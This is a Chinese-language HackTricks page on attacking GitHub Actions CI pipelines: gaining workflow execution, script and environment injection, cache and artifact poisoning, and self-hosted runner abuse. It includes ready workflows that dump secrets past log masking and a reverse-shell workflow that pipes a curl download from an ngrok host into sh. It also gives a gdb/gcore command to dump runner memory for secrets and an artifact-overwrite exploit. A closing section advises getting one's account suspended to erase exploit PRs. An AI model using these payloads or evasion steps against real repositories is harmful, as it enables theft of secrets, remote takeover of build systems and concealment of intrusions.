# 滥用 Github Actions

{% hint style="success" %}
学习和练习 AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PR 分享黑客技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}

## 基本信息

在此页面中，您将找到：

* 攻击者设法访问 Github Action 的所有影响的**摘要**
* 获取**访问 action**的不同方式：
* 拥有**权限**创建 action
* 滥用**pull request**相关触发器
* 滥用**其他外部访问**技术
* 从已被攻陷的仓库**横向移动**
* 最后，关于**从内部滥用 action 的后渗透技术**的部分（导致上述影响）

## 影响摘要

关于 [**Github Actions 的介绍，请查看基本信息**](../basic-github-information.md#github-actions)。

如果您可以在**仓库**中**执行任意 Github actions/注入代码**，您可能能够：

* **窃取**该仓库/组织的**秘密**。
* 如果您只能注入，您可以窃取工作流中已经存在的任何内容。
* 滥用**仓库权限**访问其他平台，如 AWS 和 GCP。
* 在**自定义工作者**中**执行代码**（如果使用自定义工作者）并尝试从那里横向移动。
* **覆盖**仓库**代码**。
* 这取决于 `GITHUB_TOKEN` 的权限（如果有）。
* **攻陷** **部署**和其他**工件**。
* 如果代码正在部署或存储某些内容，您可以修改它并获得进一步访问。

## GITHUB\_TOKEN

这个“**秘密**”（来自 `${{ secrets.GITHUB_TOKEN }}` 和 `${{ github.token }}`）是在管理员启用此选项时提供的：

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

这个令牌与**Github 应用程序**使用的令牌相同，因此它可以访问相同的端点：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github 应该发布一个 [**流程**](https://github.com/github/roadmap/issues/74)，**允许跨仓库**访问，因此一个仓库可以使用 `GITHUB_TOKEN` 访问其他内部仓库。
{% endhint %}

您可以在以下链接中查看此令牌的可能**权限**：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

请注意，令牌在作业完成后**过期**。\
这些令牌看起来像这样：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

使用此令牌可以做的一些有趣的事情：

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
请注意，在多种情况下，您可以在 **Github Actions 环境或秘密中找到 github 用户令牌**。这些令牌可能会赋予您对存储库和组织的更多权限。
{% endhint %}

<details>

<summary>在 Github Action 输出中列出秘密</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用 secrets 获取反向 shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

可以通过**检查操作日志**来查看其他用户仓库中Github Token的权限：

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## 允许执行

{% hint style="info" %}
这是妥协Github actions最简单的方法，因为这种情况假设你有**在组织中创建新仓库**的权限，或者对某个仓库有**写权限**。

如果你处于这种情况下，你可以直接查看[后期利用技术](./#post-exploitation-techniques-from-inside-an-action)。
{% endhint %}

### 从仓库创建执行

如果组织成员可以**创建新仓库**并且你可以执行github actions，你可以**创建一个新仓库并窃取在组织级别设置的秘密**。

### 从新分支执行

如果你可以**在已经配置了Github Action的仓库中创建一个新分支**，你可以**修改**它，**上传**内容，然后**从新分支执行该操作**。这样你可以**窃取仓库和组织级别的秘密**（但你需要知道它们的名称）。

你可以使修改后的操作**手动**执行，当**创建PR**时或**推送一些代码**时执行（取决于你想要多么安静）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
有不同的触发器可能允许攻击者**执行另一个仓库的Github Action**。如果这些可触发的操作配置不当，攻击者可能会妥协它们。
{% endhint %}

### `pull_request`

工作流触发器**`pull_request`**将在每次收到拉取请求时执行工作流，但有一些例外：默认情况下，如果这是你**第一次**进行**协作**，某些**维护者**需要**批准**工作流的**运行**：

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
由于**默认限制**是针对**首次**贡献者，你可以通过**修复有效的错误/错字**来贡献，然后发送**其他PR以滥用你的新`pull_request`权限**。

**我测试过这不行**：~~另一种选择是创建一个与曾经贡献过并删除账户的人的名字相同的账户。~~
{% endhint %}

此外，默认情况下**防止写权限**和**秘密访问**目标仓库，如[**文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)中所述：

> 除了`GITHUB_TOKEN`，**秘密不会传递给运行器**，当工作流从**forked**仓库触发时。`GITHUB_TOKEN`在来自forked仓库的拉取请求中**只有只读权限**。

攻击者可以修改Github Action的定义以执行任意操作并附加任意操作。然而，由于上述限制，他无法窃取秘密或覆盖仓库。

{% hint style="danger" %}
**是的，如果攻击者在PR中更改了将被触发的github action，他的Github Action将是被使用的，而不是原始仓库中的那个！**
{% endhint %}

由于攻击者也控制了被执行的代码，即使`GITHUB_TOKEN`没有秘密或写权限，攻击者也可以例如**上传恶意工件**。

### **`pull_request_target`**

工作流触发器**`pull_request_target`**对目标仓库有**写权限**和**访问秘密**（且不需要许可）。

注意，工作流触发器**`pull_request_target`**在**基础上下文**中运行，而不是在PR给定的上下文中运行（以**不执行不受信任的代码**）。有关`pull_request_target`的更多信息，请查看[**文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)。\
此外，有关此特定危险用法的更多信息，请查看这篇[**github博客文章**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)。

看起来因为**执行的工作流**是**基础**中定义的而不是PR中的，所以使用**`pull_request_target`**是**安全**的，但有**一些情况并非如此**。

而这个将有**访问秘密**的权限。

### `workflow_run`

[**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run)触发器允许在不同的工作流`完成`、`请求`或`进行中`时运行一个工作流。

在这个例子中，一个工作流配置为在单独的“Run Tests”工作流完成后运行：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
此外，根据文档：由 `workflow_run` 事件启动的工作流能够**访问秘密和写入令牌，即使之前的工作流没有**。

如果这种工作流**依赖**于可以通过外部用户通过**`pull_request`**或**`pull_request_target`**触发的**工作流**，则可能会受到攻击。可以在[**这个博客**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)中找到几个易受攻击的示例。第一个示例是**`workflow_run`**触发的工作流下载攻击者的代码：`${{ github.event.pull_request.head.sha }}`\
第二个示例是**将**一个**不受信任的**代码的**工件**传递给**`workflow_run`**工作流，并以使其**易受RCE攻击**的方式使用该工件的内容。

### `workflow_call`

TODO

TODO: 检查当从pull\_request执行时，使用/下载的代码是否来自原始仓库或来自fork的PR

## 滥用Forked执行

我们已经提到所有外部攻击者可能设法使github工作流执行的方式，现在让我们看看这些执行，如果配置不当，如何被滥用：

### 不受信任的checkout执行

在**`pull_request`**的情况下，工作流将在**PR的上下文**中执行（因此它将执行**恶意PR的代码**），但需要有人**首先授权**，并且它将在某些[限制](./#pull\_request)下运行。

如果工作流使用**`pull_request_target`或`workflow_run`**，并且依赖于可以从**`pull_request_target`或`pull_request`**触发的工作流，则将执行原始仓库的代码，因此**攻击者无法控制执行的代码**。

{% hint style="danger" %}
然而，如果**操作**有一个**显式的PR checkout**，它将**获取PR的代码**（而不是基础代码），它将使用攻击者控制的代码。例如（检查第12行下载PR代码的地方）：
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

在`npm install`或`npm build`期间运行的潜在**不受信任的代码**，因为构建脚本和引用的**包由PR的作者控制**。

{% hint style="warning" %}
一个搜索易受攻击操作的github dork是：`event.pull_request pull_request_target extension:yml`，然而，即使操作配置不安全，也有不同的方法可以安全地配置作业以执行（例如使用条件判断生成PR的演员是谁）。
{% endhint %}

### 上下文脚本注入 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

请注意，有某些[**github上下文**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)的值是由**创建PR的用户**控制的。如果github操作使用这些**数据来执行任何操作**，可能会导致**任意代码执行**：

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV脚本注入** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

根据文档：您可以通过定义或更新环境变量并将其写入**`GITHUB_ENV`**环境文件，使环境变量在工作流作业的任何后续步骤中可用。

如果攻击者能够**注入任何值**到这个**env**变量中，他可以注入环境变量，这些变量可以在后续步骤中执行代码，例如**LD\_PRELOAD**或**NODE\_OPTIONS**。

例如（[**这个**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0)和[**这个**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)），想象一个工作流信任上传的工件并将其内容存储在**`GITHUB_ENV`**环境变量中。攻击者可以上传类似这样的内容来进行攻击：

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### 易受攻击的第三方Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

如[**这篇博客文章**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)中提到的，这个Github Action允许访问来自不同工作流甚至仓库的工件。

问题在于，如果没有设置**`path`**参数，工件会被提取到当前目录，并且可能覆盖稍后在工作流中使用甚至执行的文件。因此，如果工件存在漏洞，攻击者可以利用这一点来攻击信任该工件的其他工作流。

易受攻击的工作流示例：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
这可以通过以下工作流进行攻击：
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## 其他外部访问

### 删除的命名空间仓库劫持

如果一个账户更改了名称，另一个用户可以在一段时间后注册该名称的账户。如果一个仓库在更改名称之前**少于100颗星**，Github将允许新注册的同名用户创建一个**同名仓库**。

{% hint style="danger" %}
因此，如果一个操作使用了一个不存在账户的仓库，攻击者仍然有可能创建该账户并危及该操作。
{% endhint %}

如果其他仓库使用了**来自该用户仓库的依赖**，攻击者将能够劫持它们。这里有一个更完整的解释：[https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## 仓库横向移动

{% hint style="info" %}
在本节中，我们将讨论一些技术，这些技术允许在假设我们对第一个仓库有某种访问权限的情况下**从一个仓库横向移动到另一个仓库**（请查看上一节）。
{% endhint %}

### 缓存中毒

在**同一分支的工作流运行之间**维护一个缓存。这意味着如果攻击者**攻陷**了一个**包**，该包被存储在缓存中并被**更高权限**的工作流下载和执行，他也将能够**攻陷**该工作流。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### 工件中毒

工作流可以使用**来自其他工作流甚至仓库的工件**，如果攻击者设法**攻陷**上传工件的Github Action，而该工件随后被另一个工作流使用，他可以**攻陷其他工作流**：

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## 从一个操作后的利用

### 通过OIDC访问AWS和GCP

查看以下页面：

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### 访问密钥 <a href="#accessing-secrets" id="accessing-secrets"></a>

如果你正在向脚本中注入内容，了解如何访问密钥是很有趣的：

* 如果密钥或令牌被设置为**环境变量**，可以通过使用**`printenv`**直接从环境中访问。

<details>

<summary>在Github Action输出中列出密钥</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用 secrets 获取反向 shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* 如果秘密**直接在表达式中使用**，生成的 shell 脚本会存储在**磁盘上**并且可以访问。
* ```bash
cat /home/runner/work/_temp/*
```
* 对于 JavaScript actions，秘密通过环境变量传递
* ```bash
ps axe | grep node
```
* 对于**自定义 action**，风险可能会因程序如何使用从**参数**获取的秘密而有所不同：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### 滥用自托管运行器

查找**在非 github 基础设施上执行的 Github Actions**的方法是搜索 Github Action 配置 yaml 中的 **`runs-on: self-hosted`**。

**自托管**运行器可能有权访问**额外的敏感信息**，访问其他**网络系统**（网络中的易受攻击端点？元数据服务？），或者，即使它是隔离和销毁的，**可能会同时运行多个 action**，恶意的 action 可能会**窃取其他 action 的秘密**。

在自托管运行器中，还可以通过转储其内存来从 **\_Runner.Listener**\_\*\* 进程\*\* 中获取秘密，该进程将在任何步骤中包含工作流的所有秘密：

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

查看[**这篇文章了解更多信息**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)。

### Github Docker Images Registry

可以创建Github actions来**构建并存储一个Docker镜像在Github中**。\
一个示例可以在以下可展开内容中找到：

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

正如你在前面的代码中看到的，Github registry 托管在 **`ghcr.io`**。

具有仓库读取权限的用户将能够使用个人访问令牌下载 Docker Image：
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
然后，用户可以搜索 **Docker 镜像层中的泄露秘密：**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions 日志中的敏感信息

即使 **Github** 尝试在 actions 日志中 **检测秘密值** 并 **避免显示** 它们，**其他敏感数据** 可能在执行 action 时生成的也不会被隐藏。例如，使用秘密值签名的 JWT 不会被隐藏，除非它被[特别配置](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)。

## 掩盖你的踪迹

（技术来自[**这里**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)）首先，任何提出的 PR 在 Github 和目标 GitHub 账户中都是公开可见的。在 GitHub 中，默认情况下我们 **不能删除互联网上的 PR**，但有一个转折点。对于被 Github **暂停** 的 GitHub 账户，他们的所有 **PR 会自动删除** 并从互联网上移除。因此，为了隐藏你的活动，你需要让你的 **GitHub 账户被暂停或被标记**。这将 **隐藏你在 GitHub 上的所有活动**（基本上移除所有的 exploit PR）。

在 GitHub 中，一个组织非常积极地向 GitHub 报告账户。你所需要做的就是在 Issue 中分享“一些东西”，他们会确保你的账户在 12 小时内被暂停 :p，这样你的 exploit 就在 github 上不可见了。

{% hint style="warning" %}
组织唯一能发现他们被攻击的方法是检查来自 SIEM 的 GitHub 日志，因为在 GitHub UI 中 PR 会被移除。
{% endhint %}

## 工具

以下工具对于查找 Github Action workflows 甚至查找易受攻击的 workflows 非常有用：

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
学习和实践 AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和实践 GCP Hacking：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们在 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PRs 到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库来分享黑客技巧**。

</details>
{% endhint %}
